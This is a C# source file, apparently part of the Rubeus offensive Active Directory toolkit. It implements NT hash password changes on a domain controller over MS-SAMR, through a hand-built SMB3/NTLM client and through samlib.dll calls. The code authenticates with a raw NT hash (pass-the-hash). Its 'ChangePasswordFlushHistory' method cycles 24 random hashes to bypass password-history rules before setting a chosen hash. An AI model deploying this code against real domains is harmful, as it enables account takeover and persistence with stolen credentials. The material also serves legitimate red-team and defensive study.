using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;

namespace Rubeus.Smb
{
    public class SamrSession : IDisposable
    {
        internal Smb2Client Smb;
        internal byte[] UserHandle;
        internal byte[] DomainHandle;
        internal byte[] ServerHandle;
        internal uint CallId;

        public void ChangePassword(byte[] oldNtHash, byte[] newNtHash)
        {
            byte[] changePwStub = SamrRpc.EncodeSamrChangePasswordUser(UserHandle, oldNtHash, newNtHash);
            byte[] changePwReq = DceRpc.CreateRequestPdu(38, changePwStub, CallId++);
            byte[] changePwResp = DceRpc.ParseResponseStub(Smb.TransactNamedPipe(changePwReq));
            SamrRpc.ParseSamrChangePasswordUserResponse(changePwResp);
        }

        public void ChangePasswordFlushHistory(byte[] currentHash, byte[] targetHash, int historyCount = 24)
        {
            byte[] hash = currentHash;
            for (int i = 0; i < historyCount; i++)
            {
                byte[] dummy = new byte[16];
                using (var rng = new System.Security.Cryptography.RNGCryptoServiceProvider())
                    rng.GetBytes(dummy);

                Console.Write("\r[*] Flushing password history ({0}/{1})", i + 1, historyCount);
                ChangePassword(hash, dummy);
                hash = dummy;
            }
            Console.WriteLine();

            ChangePassword(hash, targetHash);
        }

        public void Dispose()
        {
            if (Smb == null) return;
            try { Smb.TransactNamedPipe(DceRpc.CreateRequestPdu(1, SamrRpc.EncodeSamrCloseHandle(UserHandle), CallId++)); } catch { }
            try { Smb.TransactNamedPipe(DceRpc.CreateRequestPdu(1, SamrRpc.EncodeSamrCloseHandle(DomainHandle), CallId++)); } catch { }
            try { Smb.TransactNamedPipe(DceRpc.CreateRequestPdu(1, SamrRpc.EncodeSamrCloseHandle(ServerHandle), CallId++)); } catch { }
            Smb.Dispose();
            Smb = null;
        }
    }

    public static class SamrPasswordChange
    {
        public static SamrSession OpenSamrSession(string dcIp, string domain, string username, byte[] authNtHash)
        {
            Console.WriteLine("[*] Opening SAMR session for {0}\\{1} on {2}", domain, username, dcIp);

            if (Smb3Crypto.Debug) Smb3Crypto.SelfTest();

            var smb = new Smb2Client();
            smb.Connect(dcIp);
            smb.Negotiate();

            if (smb.Dialect != 0x0300)
                throw new Exception(string.Format(
                    "[X] DC negotiated SMB dialect 0x{0:X4}, not SMB 3.0. Use /sspi instead.", smb.Dialect));

            byte[] ntlmNeg = NtlmAuth.CreateNegotiateMessage();
            byte[] spnegoInit = NtlmAuth.CreateSpnegoNegTokenInit(ntlmNeg);
            byte[] challengeBlob = smb.SessionSetup(spnegoInit);

            byte[] ntlmChallenge = NtlmAuth.ExtractNtlmFromSpnego(challengeBlob);
            if (ntlmChallenge == null)
                throw new Exception("[X] Failed to extract NTLM challenge from SPNEGO response");

            byte[] sessionKey;
            byte[] ntlmAuth = NtlmAuth.CreateAuthenticateMessage(ntlmChallenge, domain, username, authNtHash, out sessionKey);
            byte[] spnegoAuth = NtlmAuth.CreateSpnegoNegTokenResp(ntlmAuth);
            smb.SessionSetup(spnegoAuth);

            if (smb.LastSessionSetupStatus != 0x00000000)
                throw new Exception(string.Format("[X] NTLM authentication failed: 0x{0:X8}", smb.LastSessionSetupStatus));

            smb.EnableSigning(sessionKey);
            smb.TreeConnect(dcIp);
            smb.CreateFile("samr");

            byte[] bindPdu = DceRpc.CreateBindPdu(SamrRpc.SAMR_UUID, SamrRpc.SAMR_VERSION_MAJOR, SamrRpc.SAMR_VERSION_MINOR);
            byte[] bindResp = smb.TransactNamedPipe(bindPdu);
            DceRpc.ValidateBindAck(bindResp);

            uint callId = 2;

            byte[] connectStub = SamrRpc.EncodeSamrConnect(dcIp);
            byte[] connectReq = DceRpc.CreateRequestPdu(0, connectStub, callId++);
            byte[] connectResp = DceRpc.ParseResponseStub(smb.TransactNamedPipe(connectReq));
            byte[] serverHandle = SamrRpc.ParseSamrConnectResponse(connectResp);

            byte[] lookupStub = SamrRpc.EncodeSamrLookupDomain(serverHandle, domain.ToUpper());
            byte[] lookupReq = DceRpc.CreateRequestPdu(5, lookupStub, callId++);
            byte[] lookupResp = DceRpc.ParseResponseStub(smb.TransactNamedPipe(lookupReq));
            byte[] domainSid = SamrRpc.ParseSamrLookupDomainResponse(lookupResp);

            byte[] openDomStub = SamrRpc.EncodeSamrOpenDomain(serverHandle, domainSid);
            byte[] openDomReq = DceRpc.CreateRequestPdu(7, openDomStub, callId++);
            byte[] openDomResp = DceRpc.ParseResponseStub(smb.TransactNamedPipe(openDomReq));
            byte[] domainHandle = SamrRpc.ParseSamrOpenDomainResponse(openDomResp);

            byte[] lookupNameStub = SamrRpc.EncodeSamrLookupNames(domainHandle, username);
            byte[] lookupNameReq = DceRpc.CreateRequestPdu(17, lookupNameStub, callId++);
            byte[] lookupNameResp = DceRpc.ParseResponseStub(smb.TransactNamedPipe(lookupNameReq));
            uint rid = SamrRpc.ParseSamrLookupNamesResponse(lookupNameResp);

            byte[] openUserStub = SamrRpc.EncodeSamrOpenUser(domainHandle, rid);
            byte[] openUserReq = DceRpc.CreateRequestPdu(34, openUserStub, callId++);
            byte[] openUserResp = DceRpc.ParseResponseStub(smb.TransactNamedPipe(openUserReq));
            byte[] userHandle = SamrRpc.ParseSamrOpenUserResponse(openUserResp);

            Console.WriteLine("[+] SAMR session opened (RID {0})", rid);

            return new SamrSession
            {
                Smb = smb,
                UserHandle = userHandle,
                DomainHandle = domainHandle,
                ServerHandle = serverHandle,
                CallId = callId
            };
        }

        public static void ChangeNtHash(string dcIp, string domain, string username, byte[] oldNtHash, byte[] newNtHash)
        {
            Console.WriteLine("[*] Changing password for {0}\\{1} via MS-SAMR on {2}", domain, username, dcIp);
            using (var session = OpenSamrSession(dcIp, domain, username, oldNtHash))
            {
                session.ChangePassword(oldNtHash, newNtHash);
                Console.WriteLine("[+] SamiChangePasswordUser OK");
            }
        }

        public static void ChangeNtHashLocal(string dcIp, string domain, string username, byte[] oldNtHash, byte[] newNtHash)
        {
            Console.WriteLine("[*] Changing password for {0}\\{1} via samlib on {2}", domain, username, dcIp);

            NTAccount objUser = new NTAccount(domain + "\\" + username);
            SecurityIdentifier account = (SecurityIdentifier)objUser.Translate(typeof(SecurityIdentifier));

            IntPtr samHandle = IntPtr.Zero;
            IntPtr domainHandle = IntPtr.Zero;
            IntPtr userHandle = IntPtr.Zero;
            int status = 0;
            UNICODE_STRING ustrServer = new UNICODE_STRING();

            try
            {
                if (String.IsNullOrEmpty(dcIp))
                {
                    status = SamConnect(IntPtr.Zero, out samHandle, MAXIMUM_ALLOWED, false);
                }
                else
                {
                    ustrServer = InitializeUnicodeString(dcIp);
                    status = SamConnect(ref ustrServer, out samHandle, MAXIMUM_ALLOWED, false);
                }
                if (status != 0)
                    throw new Exception(string.Format("[X] SamConnect failed: NTSTATUS 0x{0:X8}", status));
                Console.WriteLine("[+] SamConnect OK");

                byte[] sid = new byte[SecurityIdentifier.MaxBinaryLength];
                account.AccountDomainSid.GetBinaryForm(sid, 0);
                status = SamOpenDomain(samHandle, MAXIMUM_ALLOWED, sid, out domainHandle);
                if (status != 0)
                    throw new Exception(string.Format("[X] SamOpenDomain failed: NTSTATUS 0x{0:X8}", status));
                Console.WriteLine("[+] SamOpenDomain OK");

                int rid = GetRID(account);
                Console.WriteLine("[+] RID is {0}", rid);

                status = SamOpenUser(domainHandle, MAXIMUM_ALLOWED, rid, out userHandle);
                if (status != 0)
                    throw new Exception(string.Format("[X] SamOpenUser failed: NTSTATUS 0x{0:X8}", status));
                Console.WriteLine("[+] SamOpenUser OK");

                byte[] oldLm = new byte[16];
                byte[] newLm = new byte[16];
                status = SamiChangePasswordUser(userHandle, false, oldLm, newLm, true, oldNtHash, newNtHash);
                if (status != 0)
                    throw new Exception(string.Format("[X] SamiChangePasswordUser failed: NTSTATUS 0x{0:X8}", status));
                Console.WriteLine("[+] SamiChangePasswordUser OK");
            }
            finally
            {
                if (userHandle != IntPtr.Zero) SamCloseHandle(userHandle);
                if (domainHandle != IntPtr.Zero) SamCloseHandle(domainHandle);
                if (samHandle != IntPtr.Zero) SamCloseHandle(samHandle);
                FreeUnicodeString(ustrServer);
            }
        }

        private static int GetRID(SecurityIdentifier sid)
        {
            string sidstring = sid.Value;
            int pos = sidstring.LastIndexOf('-');
            string rid = sidstring.Substring(pos + 1);
            return int.Parse(rid);
        }

        internal static byte[] EncryptNtOwfWithNtOwf(byte[] plainHash, byte[] keyHash)
        {
            byte[] result = new byte[16];
            byte[] key1 = ExpandDesKey(keyHash, 0);
            byte[] key2 = ExpandDesKey(keyHash, 7);

            using (var des = new DESCryptoServiceProvider())
            {
                des.Mode = CipherMode.ECB;
                des.Padding = PaddingMode.None;

                des.Key = key1;
                using (var enc = des.CreateEncryptor())
                    enc.TransformBlock(plainHash, 0, 8, result, 0);

                des.Key = key2;
                using (var enc = des.CreateEncryptor())
                    enc.TransformBlock(plainHash, 8, 8, result, 8);
            }
            return result;
        }

        private static byte[] ExpandDesKey(byte[] input, int offset)
        {
            byte[] key = new byte[8];
            key[0] = (byte)(input[offset + 0] >> 1);
            key[1] = (byte)(((input[offset + 0] & 0x01) << 6) | (input[offset + 1] >> 2));
            key[2] = (byte)(((input[offset + 1] & 0x03) << 5) | (input[offset + 2] >> 3));
            key[3] = (byte)(((input[offset + 2] & 0x07) << 4) | (input[offset + 3] >> 4));
            key[4] = (byte)(((input[offset + 3] & 0x0F) << 3) | (input[offset + 4] >> 5));
            key[5] = (byte)(((input[offset + 4] & 0x1F) << 2) | (input[offset + 5] >> 6));
            key[6] = (byte)(((input[offset + 5] & 0x3F) << 1) | (input[offset + 6] >> 7));
            key[7] = (byte)(input[offset + 6] & 0x7F);

            for (int i = 0; i < 8; i++)
                key[i] = (byte)((key[i] << 1) & 0xFE);

            SetDesKeyParity(key);
            return key;
        }

        private static void SetDesKeyParity(byte[] key)
        {
            for (int i = 0; i < key.Length; i++)
            {
                int parity = 0;
                for (int bit = 1; bit < 8; bit++)
                    if ((key[i] & (1 << bit)) != 0) parity++;
                if (parity % 2 == 0) key[i] |= 1;
                else key[i] &= 0xFE;
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct UNICODE_STRING { public ushort Length; public ushort MaximumLength; public IntPtr Buffer; }

        private const int MAXIMUM_ALLOWED = 0x02000000;

        [DllImport("samlib.dll")] private static extern int SamConnect(ref UNICODE_STRING ServerName, out IntPtr ServerHandle, int DesiredAccess, bool reserved);
        [DllImport("samlib.dll")] private static extern int SamConnect(IntPtr ServerName, out IntPtr ServerHandle, int DesiredAccess, bool reserved);
        [DllImport("samlib.dll")] private static extern int SamOpenDomain(IntPtr ServerHandle, int DesiredAccess, byte[] DomainId, out IntPtr DomainHandle);
        [DllImport("samlib.dll")] private static extern int SamOpenUser(IntPtr DomainHandle, int DesiredAccess, int UserId, out IntPtr UserHandle);
        [DllImport("samlib.dll")] private static extern int SamiChangePasswordUser(IntPtr UserHandle, bool isOldLm, byte[] oldLm, byte[] newLm, bool isNewNt, byte[] oldNt, byte[] newNt);
        [DllImport("samlib.dll")] private static extern int SamCloseHandle(IntPtr Handle);

        private static UNICODE_STRING InitializeUnicodeString(string s)
        {
            var us = new UNICODE_STRING();
            us.Length = (ushort)(s.Length * 2);
            us.MaximumLength = (ushort)(us.Length + 2);
            us.Buffer = Marshal.StringToHGlobalUni(s);
            return us;
        }

        private static void FreeUnicodeString(UNICODE_STRING us) { if (us.Buffer != IntPtr.Zero) Marshal.FreeHGlobal(us.Buffer); }
    }
}
